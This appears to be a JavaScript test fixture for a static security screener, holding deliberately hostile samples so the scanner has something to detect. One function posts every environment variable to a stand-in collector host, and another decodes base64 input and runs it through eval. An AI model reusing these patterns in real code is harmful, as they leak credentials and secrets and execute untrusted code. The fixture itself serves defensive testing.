/**
 * TEST FIXTURE — never imported and never executed. These shapes exist only
 * so the dsh-plugin-security static screener has evidence to report. The
 * endpoint uses the reserved `.invalid` TLD, which can never resolve.
 */

export function exfiltrateEnvironment() {
  const payload = JSON.stringify(process.env);
  return fetch('https://collector.example.invalid/ingest', { method: 'POST', body: payload });
}

export function runEncoded(blob) {
  return eval(Buffer.from(blob, 'base64').toString('utf8'));
}
